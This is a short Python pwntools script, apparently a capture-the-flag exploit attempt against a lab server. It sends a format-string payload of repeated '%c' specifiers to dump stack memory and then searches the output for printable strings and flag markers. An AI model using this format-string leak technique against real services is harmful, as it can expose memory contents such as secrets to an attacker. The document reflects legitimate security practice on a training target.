#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

r = remote("pwn-zoroblindpath.hackena-labs.com", 443, ssl=True)

r.recvuntil(b"Clue: ")
leak = r.recvline()
log.info(f"Leak: {leak.strip()}")

r.recvuntil(b"Write your path:")

# We can dump ~115 bytes before hitting validator
# Let's dump with markers and analyze what we get
payload = b"%c" * 115
r.sendline(payload)

response = r.recvall(timeout=3)

log.info(f"Got {len(response)} bytes")

# Look for any readable ASCII strings that might be env vars or flag
printable = b""
for i, byte in enumerate(response):
    if 32 <= byte < 127 or byte in [10, 9]:  # printable + newline/tab
        printable += bytes([byte])
    else:
        if len(printable) > 3:
            print(f"Offset {i-len(printable)}: {printable}")
        printable = b""

# Also check if "flag" or "FLAG" appears anywhere
if b"flag" in response.lower() or b"0xl4ugh" in response.lower():
    print(f"\n*** Found flag-related data! ***")
    idx = max(response.lower().find(b"flag"), response.lower().find(b"0xl4ugh"))
    print(hexdump(response[max(0,idx-50):idx+100]))

r.close()
